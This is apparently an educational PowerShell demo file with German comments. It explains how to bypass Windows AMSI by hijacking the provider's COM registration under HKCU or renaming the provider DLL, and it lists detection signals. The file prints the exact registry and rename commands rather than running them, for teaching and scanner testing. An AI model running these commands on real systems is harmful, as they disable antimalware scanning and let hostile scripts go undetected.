# AMSI Bypass: COM Server Hijacking / Provider Unloading
# ========================================================
# ACHTUNG: Dies ist eine BILDUNGSDATEI. Nicht auf Produktivsystemen ausfuehren!
#
# TECHNIK: Manipulation der AMSI COM-Registrierung um den Provider
# unwirksam zu machen oder durch einen eigenen zu ersetzen.
#
# WARUM ES FUNKTIONIERT:
# AMSI-Provider werden ueber COM-Registry-Eintraege geladen.
# Wenn ein Angreifer Admin-Rechte hat, kann er:
# 1. Den Provider-GUID aus HKLM\SOFTWARE\Microsoft\AMSI\Providers entfernen
# 2. Die DLL-Referenz auf eine harmlose DLL umleiten
# 3. Einen eigenen "Always-Clean" Provider registrieren
#
# Ohne Admin: User-Level COM-Hijacking ueber HKCU\Software\Classes\CLSID
# (HKCU hat Prioritaet ueber HKLM fuer COM-Lookups!)
#
# ERKENNUNG:
# - Unser Scanner erkennt "amsiutils" als suspicious pattern
# - Registry-Manipulation wird von EDR/Sysmon erkannt (Event ID 12/13)

# --- Demonstration: Provider-Status pruefen ---
$providerGuid = "{2E5D8A62-77F9-4F7B-A90B-1C8F6E9D4C3A}"
$amsiKey = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\$providerGuid"

Write-Host "=== AMSI Provider Hijacking Demo ==="
Write-Host ""

# Check current registration
if (Test-Path $amsiKey) {
    Write-Host "[!] Provider is registered at: $amsiKey"
} else {
    Write-Host "[*] Provider not registered (already unloaded?)"
}

# --- Theoretischer Hijack via HKCU (kein Admin noetig!) ---
Write-Host ""
Write-Host "--- Theoretical HKCU Hijack (no admin needed) ---"
Write-Host "Command would be:"
Write-Host '  New-Item -Path "HKCU:\Software\Classes\CLSID\$providerGuid\InprocServer32" -Force'
Write-Host '  Set-ItemProperty -Path "..." -Name "(Default)" -Value "C:\dummy.dll"'
Write-Host ""
Write-Host "This redirects COM to load dummy.dll instead of the real provider!"
Write-Host "HKCU takes precedence over HKLM for COM class lookups."

# --- Alternative: AMSI Provider DLL umbenennen ---
Write-Host ""
Write-Host "--- Alternative: DLL Rename Attack ---"
Write-Host "If attacker has write access to DLL directory:"
Write-Host "  Rename-Item MostShittyAVWrapper.dll MostShittyAVWrapper.dll.bak"
Write-Host "  AMSI will fail to load provider -> scans return clean"
